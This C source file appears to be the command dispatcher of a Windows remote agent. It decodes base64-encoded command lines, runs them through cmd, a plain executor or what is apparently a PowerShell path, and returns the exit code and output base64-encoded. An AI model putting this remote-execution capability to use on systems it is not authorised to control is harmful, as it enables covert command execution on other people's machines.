#include "commands.h"
#include "debug.h"
#include "base64.h"
#include "exec.h"

//TODO: add help command

// DO NOT FORGET TO INCREASE IF ADDING NEW COMMAND
#define NUMBER_OF_CMDS 7

// DO NOT FORGET TO ADD COMMAND TO BANNER IF ADDING NEW COMMAND
WCHAR* BANNER = TEXT("started_ok possible commands: exit, base64enc, base64dec, exec, exec_in, exec_cmd, exec_pse");

struct Command {
	WCHAR* cmdname;
	VOID (*cmdfunc)(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout);};

// command function declarations and commands array

VOID cmd_exit(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout);
VOID cmd_base64enc(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout);
VOID cmd_base64dec(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout);
VOID cmd_exec(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout);
VOID cmd_exec_in(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout);
VOID cmd_exec_cmd(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout);
VOID cmd_exec_pse(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout);

struct Command commands[NUMBER_OF_CMDS] = {
    {TEXT("exit"), cmd_exit }, 
    {TEXT("base64enc"), cmd_base64enc },
    {TEXT("base64dec"), cmd_base64dec },
    {TEXT("exec"), cmd_exec },
    {TEXT("exec_in"), cmd_exec_in },
    {TEXT("exec_cmd"), cmd_exec_cmd },
    {TEXT("exec_pse"), cmd_exec_pse },
};

// FindCommand and ExecCommand

struct Command * FindCommand(WCHAR* cmdline){
	int i;
	size_t cmdlen;
	size_t cmdline_len = wcslen(cmdline);
	for (i=0; i<NUMBER_OF_CMDS; i++){
		cmdlen = wcslen(commands[i].cmdname);
		if (cmdlen == cmdline_len || TEXT(' ') == cmdline[cmdlen])
			if (0 == wcsncmp(cmdline, commands[i].cmdname, cmdlen)){
				debug(TEXT("Found command: %s"), commands[i].cmdname);
				return &commands[i];}}
	debug(TEXT("Command not found: %s"), cmdline);
	return NULL;}

VOID ExecCommand(struct Command *cmd, WCHAR* cmdline, WCHAR* result, HANDLE stopevent, int timeout){
	WCHAR* args = cmdline + wcslen(cmd->cmdname) + 1;
	cmd->cmdfunc(args, result, stopevent, timeout);}

// aux

VOID UpdateResult(WCHAR **result, size_t * bufsize, WCHAR *addstr);
VOID b64UpdateResult(WCHAR **result, size_t * bufsize, WCHAR *addstr);

// command functions

VOID cmd_exit(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout){
	SetEvent(stopevent);
	wcscpy_s(result, CMD_RESULT_BUFSIZE, CMD_RESULT_OK);}

VOID cmd_base64enc(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout){
	debug(TEXT("command base64enc arg: %s"), args);
	wcscpy_s(result, CMD_RESULT_BUFSIZE, CMD_RESULT_OK);
	result += wcslen(CMD_RESULT_OK);
	wcscpy_s(result, CMD_RESULT_BUFSIZE - wcslen(CMD_RESULT_OK), TEXT(" "));
	result += 1;
	base64encode(args, result, CMD_RESULT_BUFSIZE - wcslen(CMD_RESULT_OK) - 1);}

VOID cmd_base64dec(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout){
	debug(TEXT("command base64dec arg: %s"), args);
	wcscpy_s(result, CMD_RESULT_BUFSIZE, CMD_RESULT_OK);
	result += wcslen(CMD_RESULT_OK);
	wcscpy_s(result, CMD_RESULT_BUFSIZE - wcslen(CMD_RESULT_OK), TEXT(" "));
	result += 1;
	base64decode(args, result, CMD_RESULT_BUFSIZE - wcslen(CMD_RESULT_OK) - 1);}


VOID cmd_exec(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout){
	debug(TEXT("command exec arg: %s"), args);
	WCHAR *next_token;
	WCHAR seps[] = TEXT(" ");
	WCHAR * encoded_cmdline = wcstok_s(args, seps, &next_token);
	WCHAR * str_timeout = wcstok_s(NULL, seps, &next_token);
	WCHAR cmdline[EXEC_MAX_CMDLINE];
	WCHAR in[1];
	in[0] = 0;
	WCHAR out[EXEC_MAX_OUT];
	WCHAR err[EXEC_MAX_OUT];
	WCHAR reason[EXEC_MAX_REASON];
	WCHAR str_exitcode[10];
	DWORD exitcode;
	DWORD exec_timeout;
	size_t result_buf_size = CMD_RESULT_BUFSIZE;
	BOOL success;
	base64decode(encoded_cmdline, cmdline, EXEC_MAX_CMDLINE);
	exec_timeout = _wtoi(str_timeout);
	success = Execute(cmdline, in, out, err, EXEC_MAX_OUT, &exitcode, reason, stopevent, exec_timeout);
	if (success){
		UpdateResult(&result, &result_buf_size, CMD_RESULT_OK);
		UpdateResult(&result, &result_buf_size, TEXT(" exitcode:"));
		swprintf(str_exitcode, 10, TEXT("%d"), exitcode);
		UpdateResult(&result, &result_buf_size, str_exitcode);}
	else {
		UpdateResult(&result, &result_buf_size, CMD_RESULT_NOTOK);
		UpdateResult(&result, &result_buf_size, TEXT(" reason:"));
		b64UpdateResult(&result, &result_buf_size, reason);}
	UpdateResult(&result, &result_buf_size, TEXT(" stdout:"));
	b64UpdateResult(&result, &result_buf_size, out);
	UpdateResult(&result, &result_buf_size, TEXT(" stderr:"));
	b64UpdateResult(&result, &result_buf_size, err);}


VOID cmd_exec_in(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout){
	debug(TEXT("command exec_in arg: %s"), args);
	WCHAR *next_token;
	WCHAR seps[] = TEXT(" ");
	WCHAR * encoded_cmdline = wcstok_s(args, seps, &next_token);
	WCHAR * encoded_in = wcstok_s(NULL, seps, &next_token);
	WCHAR * str_timeout = wcstok_s(NULL, seps, &next_token);
	WCHAR cmdline[EXEC_MAX_CMDLINE];
	WCHAR in[EXEC_MAX_IN];
	WCHAR out[EXEC_MAX_OUT];
	WCHAR err[EXEC_MAX_OUT];
	WCHAR reason[EXEC_MAX_REASON];
	WCHAR str_exitcode[10];
	DWORD exitcode;
	DWORD exec_timeout;
	size_t result_buf_size = CMD_RESULT_BUFSIZE;
	BOOL success;
	base64decode(encoded_cmdline, cmdline, EXEC_MAX_CMDLINE);
	base64decode(encoded_in, in, EXEC_MAX_IN);
	exec_timeout = _wtoi(str_timeout);
	success = Execute(cmdline, in, out, err, EXEC_MAX_OUT, &exitcode, reason, stopevent, exec_timeout);
	if (success){
		UpdateResult(&result, &result_buf_size, CMD_RESULT_OK);
		UpdateResult(&result, &result_buf_size, TEXT(" exitcode:"));
		swprintf(str_exitcode, 10, TEXT("%d"), exitcode);
		UpdateResult(&result, &result_buf_size, str_exitcode);}
	else {
		UpdateResult(&result, &result_buf_size, CMD_RESULT_NOTOK);
		UpdateResult(&result, &result_buf_size, TEXT(" reason:"));
		b64UpdateResult(&result, &result_buf_size, reason);}
	UpdateResult(&result, &result_buf_size, TEXT(" stdout:"));
	b64UpdateResult(&result, &result_buf_size, out);
	UpdateResult(&result, &result_buf_size, TEXT(" stderr:"));
	b64UpdateResult(&result, &result_buf_size, err);}


VOID cmd_exec_cmd(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout){
	debug(TEXT("command exec_cmd arg: %s"), args);
	WCHAR *next_token;
	WCHAR seps[] = TEXT(" ");
	WCHAR * encoded_cmdline = wcstok_s(args, seps, &next_token);
	WCHAR * str_timeout = wcstok_s(NULL, seps, &next_token);
	WCHAR cmdline[EXEC_MAX_CMDLINE];
	WCHAR in[1];
	in[0] = 0;
	WCHAR out[EXEC_MAX_OUT];
	WCHAR err[EXEC_MAX_OUT];
	WCHAR reason[EXEC_MAX_REASON];
	WCHAR str_exitcode[10];
	DWORD exitcode;
	DWORD exec_timeout;
	size_t result_buf_size = CMD_RESULT_BUFSIZE;
	BOOL success;
	base64decode(encoded_cmdline, cmdline, EXEC_MAX_CMDLINE);
	exec_timeout = _wtoi(str_timeout);
	success = Execute_CMD(cmdline, out, err, EXEC_MAX_OUT, &exitcode, reason, stopevent, exec_timeout);
	if (success){
		UpdateResult(&result, &result_buf_size, CMD_RESULT_OK);
		UpdateResult(&result, &result_buf_size, TEXT(" exitcode:"));
		swprintf(str_exitcode, 10, TEXT("%d"), exitcode);
		UpdateResult(&result, &result_buf_size, str_exitcode);}
	else {
		UpdateResult(&result, &result_buf_size, CMD_RESULT_NOTOK);
		UpdateResult(&result, &result_buf_size, TEXT(" reason:"));
		b64UpdateResult(&result, &result_buf_size, reason);}
	UpdateResult(&result, &result_buf_size, TEXT(" stdout:"));
	b64UpdateResult(&result, &result_buf_size, out);
	UpdateResult(&result, &result_buf_size, TEXT(" stderr:"));
	b64UpdateResult(&result, &result_buf_size, err);}


VOID cmd_exec_pse(WCHAR* args, WCHAR* result, HANDLE stopevent, int timeout){
	debug(TEXT("command exec_pse arg: %s"), args);
	WCHAR *next_token;
	WCHAR seps[] = TEXT(" ");
	WCHAR * encoded_pse_cmd = wcstok_s(args, seps, &next_token);
	WCHAR * str_timeout = wcstok_s(NULL, seps, &next_token);
	WCHAR in[1];
	in[0] = 0;
	WCHAR out[EXEC_MAX_OUT];
	WCHAR err[EXEC_MAX_OUT];
	WCHAR reason[EXEC_MAX_REASON];
	WCHAR str_exitcode[10];
	DWORD exitcode;
	DWORD exec_timeout;
	size_t result_buf_size = CMD_RESULT_BUFSIZE;
	BOOL success;
	exec_timeout = _wtoi(str_timeout);
	success = Execute_PSE(encoded_pse_cmd, out, err, EXEC_MAX_OUT, &exitcode, reason, stopevent, exec_timeout);
	if (success){
		UpdateResult(&result, &result_buf_size, CMD_RESULT_OK);
		UpdateResult(&result, &result_buf_size, TEXT(" exitcode:"));
		swprintf(str_exitcode, 10, TEXT("%d"), exitcode);
		UpdateResult(&result, &result_buf_size, str_exitcode);}
	else {
		UpdateResult(&result, &result_buf_size, CMD_RESULT_NOTOK);
		UpdateResult(&result, &result_buf_size, TEXT(" reason:"));
		b64UpdateResult(&result, &result_buf_size, reason);}
	UpdateResult(&result, &result_buf_size, TEXT(" stdout:"));
	b64UpdateResult(&result, &result_buf_size, out);
	UpdateResult(&result, &result_buf_size, TEXT(" stderr:"));
	b64UpdateResult(&result, &result_buf_size, err);}


// aux

VOID UpdateResult(WCHAR **result, size_t * bufsize, WCHAR *addstr){
	wcscpy_s(*result, *bufsize, addstr);
	size_t len = wcslen(*result);
	*result += len;
	*bufsize -= len;}

VOID b64UpdateResult(WCHAR **result, size_t * bufsize, WCHAR *addstr){
	base64encode(addstr, *result, *bufsize);
	size_t len = wcslen(*result);
	*result += len;
	*bufsize -= len;}